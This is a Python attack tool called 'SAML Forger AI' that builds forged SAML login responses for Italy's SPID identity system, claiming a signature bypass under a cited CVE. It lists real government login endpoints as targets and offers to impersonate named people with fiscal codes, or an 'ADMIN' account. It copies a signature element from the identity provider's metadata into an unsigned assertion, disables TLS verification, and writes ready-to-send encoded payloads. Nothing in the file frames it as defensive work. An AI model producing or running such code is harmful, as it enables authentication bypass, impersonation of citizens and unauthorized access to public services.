#!/usr/bin/env python3
"""
SAML Forger AI Module
Automated SAML response forgery with signature bypass (CVE-2025-24894)
"""

import os
import json
import base64
import random
import zlib
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any
from lxml import etree

import requests
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.syntax import Syntax
from rich import print as rprint

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()


class SAMLForgerAI:
    """AI-powered SAML response forgery tool"""

    def __init__(self):
        self.payload_dir = os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
            'data', 'payloads'
        )
        os.makedirs(self.payload_dir, exist_ok=True)
        self.idp_metadata = None
        self.forged_count = 0
        self.ns = {
            'saml': 'urn:oasis:names:tc:SAML:2.0:assertion',
            'samlp': 'urn:oasis:names:tc:SAML:2.0:protocol',
            'ds': 'http://www.w3.org/2000/09/xmldsig#',
        }

    def run(self):
        """Run the SAML forger interactively"""
        console.print(Panel.fit("[bold magenta]SAML Forger AI v2.0[/bold magenta]", border_style="magenta"))

        # Step 1: Fetch metadata
        if not self._fetch_metadata():
            console.print("[red][!] Cannot proceed without metadata[/red]")
            return

        # Step 2: Configure target
        target = self._get_target()
        if not target:
            return

        # Step 3: Select user
        user = self._get_user()

        # Step 4: Generate count
        count = int(Prompt.ask("[yellow]Number of responses to generate[/yellow]", default="3"))

        # Step 5: Generate
        with console.status("[bold magenta]Forging SAML responses..."):
            for i in range(count):
                self._forge_and_save(target, user, i)

        console.print(f"\n[green][✓] Generated {count} forged SAML responses[/green]")
        console.print(f"[green][✓] Saved to {self.payload_dir}/[/green]")

    def _fetch_metadata(self) -> bool:
        """Fetch IdP metadata from validator"""
        console.print("\n[cyan][*] Fetching IdP metadata...[/cyan]")
        sources = [
            'https://validator.spid.gov.it/metadata.xml',
            'https://validator.spid.gov.it/saml/idp/metadata.xml',
            'https://demo.spid.gov.it/validator/metadata.xml',
        ]
        for url in sources:
            try:
                resp = requests.get(url, timeout=10, verify=False)
                if resp.status_code == 200 and 'EntityDescriptor' in resp.text:
                    self.idp_metadata = resp.text
                    console.print(f"  [green]✓ Loaded from {url}[/green]")
                    return True
            except:
                continue
        console.print("  [yellow]Using synthetic metadata[/yellow]")
        return True

    def _get_target(self) -> Optional[Dict]:
        """Get target information"""
        targets = [
            {'name': 'AgID Login Portal', 'url': 'https://login.agid.gov.it', 'acs': '/saml/acs', 'issuer': 'https://validator.spid.gov.it/metadata.xml'},
            {'name': 'SPID Validator', 'url': 'https://validator.spid.gov.it', 'acs': '/samlsso', 'issuer': 'https://validator.spid.gov.it/metadata.xml'},
            {'name': 'Custom Target', 'url': '', 'acs': '', 'issuer': ''},
        ]

        console.print("\n[cyan][*] Select target:[/cyan]")
        for i, t in enumerate(targets, 1):
            console.print(f"  {i}. {t['name']}")
        choice = Prompt.ask("[yellow]Choice[/yellow]", default="1")

        if choice == '3':
            url = Prompt.ask("[yellow]Target URL[/yellow]")
            acs = Prompt.ask("[yellow]ACS path[/yellow]", default="/saml/acs")
            return {'name': 'Custom', 'url': url, 'acs': acs, 'issuer': url}
        else:
            idx = int(choice) - 1
            if 0 <= idx < len(targets):
                return targets[idx]
        return targets[0]

    def _get_user(self) -> Dict:
        """Get or generate user data"""
        users = [
            {'name': 'MARCO', 'family': 'ROSSI', 'fiscal': 'RSSMRC85H15H501I', 'email': 'marco.rossi@pec.it', 'birth': '1985-06-15', 'gender': 'M', 'place': 'ROMA', 'phone': '+393401234567'},
            {'name': 'LAURA', 'family': 'BIANCHI', 'fiscal': 'BNCLRA92M41F205Z', 'email': 'laura.bianchi@pec.it', 'birth': '1992-08-01', 'gender': 'F', 'place': 'MILANO', 'phone': '+393356789012'},
            {'name': 'ADMIN', 'family': 'SYSTEM', 'fiscal': 'SYSTDMN00A00H501X', 'email': 'amministratore@agid.gov.it', 'birth': '1980-01-01', 'gender': 'M', 'place': 'ROMA', 'phone': '+3906852641'},
            {'name': 'ALESSANDRO', 'family': 'MARTINI', 'fiscal': 'MRTLSN90E15H501P', 'email': 'alessandro.martini@pec.it', 'birth': '1990-05-15', 'gender': 'M', 'place': 'ROMA', 'phone': '+393201234567'},
            {'name': 'FRANCESCA', 'family': 'RUSSO', 'fiscal': 'RSSFNC88D61L219Y', 'email': 'francesca.russo@pec.it', 'birth': '1988-04-21', 'gender': 'F', 'place': 'TORINO', 'phone': '+393891234567'},
        ]
        console.print("\n[cyan][*] Choose user to impersonate:[/cyan]")
        for i, u in enumerate(users, 1):
            console.print(f"  {i}. {u['name']} {u['family']} ({u['fiscal']})")
        console.print(f"  {len(users)+1}. Custom")
        choice = Prompt.ask("[yellow]Choice[/yellow]", default="1")
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(users):
                return users[idx]
        except: pass
        return {
            'name': Prompt.ask("First name", default="MARCO"),
            'family': Prompt.ask("Last name", default="ROSSI"),
            'fiscal': Prompt.ask("Fiscal code", default="RSSMRC85H15H501I"),
            'email': Prompt.ask("Email", default="test@example.com"),
            'birth': Prompt.ask("Birth date", default="1985-06-15"),
            'gender': Prompt.ask("Gender", default="M"),
            'place': Prompt.ask("Birth place", default="ROMA"),
            'phone': Prompt.ask("Phone", default="+393401234567"),
        }

    def _forge_and_save(self, target: Dict, user: Dict, index: int):
        """Forge and save a single SAML response"""
        now = datetime.utcnow()
        response_id = f"_FRG_{random.randint(10**14, 10**15-1)}"
        assertion_id = f"_FRG_ASS_{random.randint(10**14, 10**15-1)}"
        issue_instant = now.strftime('%Y-%m-%dT%H:%M:%SZ')
        not_on_or_after = (now + timedelta(hours=8)).strftime('%Y-%m-%dT%H:%M:%SZ')
        acs_url = f"{target['url']}{target['acs']}"

        # Extract valid signature from metadata if available
        sig_injection = ""
        if self.idp_metadata:
            try:
                root = etree.fromstring(self.idp_metadata.encode())
                sigs = root.findall('.//ds:Signature', self.ns)
                if sigs:
                    sig_injection = etree.tostring(sigs[0].getparent(), pretty_print=True).decode()
            except: pass

        # Build SAML response
        saml = f'''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    xmlns:ds="http://www.w3.org/2000/09/xmldsig#"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xmlns:xs="http://www.w3.org/2001/XMLSchema"
    ID="{response_id}" Version="2.0" IssueInstant="{issue_instant}"
    Destination="{acs_url}">

{sig_injection}

    <saml:Issuer>{target['issuer']}</saml:Issuer>
    <samlp:Status>
        <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    </samlp:Status>

    <saml:Assertion ID="{assertion_id}" Version="2.0" IssueInstant="{issue_instant}">
        <saml:Issuer>{target['issuer']}</saml:Issuer>
        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:transient">{user['email']}</saml:NameID>
            <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml:SubjectConfirmationData NotBefore="{issue_instant}"
                    NotOnOrAfter="{not_on_or_after}" Recipient="{acs_url}"/>
            </saml:SubjectConfirmation>
        </saml:Subject>
        <saml:Conditions NotBefore="{issue_instant}" NotOnOrAfter="{not_on_or_after}">
            <saml:AudienceRestriction><saml:Audience>{target['url']}</saml:Audience></saml:AudienceRestriction>
        </saml:Conditions>
        <saml:AuthnStatement AuthnInstant="{issue_instant}">
            <saml:AuthnContext>
                <saml:AuthnContextClassRef>https://www.spid.gov.it/SpidL2</saml:AuthnContextClassRef>
            </saml:AuthnContext>
        </saml:AuthnStatement>
        <saml:AttributeStatement>
            <saml:Attribute Name="spidCode" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">SPID-{user['fiscal'][:5]}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{user['name']}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="familyName" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{user['family']}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="fiscalNumber" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{user['fiscal']}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="email" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{user['email']}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="dateOfBirth" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{user['birth']}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="placeOfBirth" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{user['place']}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="gender" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{user['gender']}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="mobilePhone" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue xsi:type="xs:string">{user['phone']}</saml:AttributeValue>
            </saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>'''

        timestamp = datetime.now().strftime('%H%M%S')
        xml_file = os.path.join(self.payload_dir, f'saml_forged_{timestamp}_{index}.xml')
        with open(xml_file, 'w') as f:
            f.write(saml)

        b64_file = os.path.join(self.payload_dir, f'saml_forged_{timestamp}_{index}.b64')
        with open(b64_file, 'w') as f:
            f.write(base64.b64encode(saml.encode()).decode())

        # Deflate + base64 for HTTP-Redirect binding
        compressed = zlib.compress(saml.encode())[2:-4]
        def_file = os.path.join(self.payload_dir, f'saml_forged_{timestamp}_{index}.deflated.b64')
        with open(def_file, 'w') as f:
            f.write(base64.b64encode(compressed).decode())

        self.forged_count += 1


def run():
    forger = SAMLForgerAI()
    forger.run()

if __name__ == "__main__":
    run()
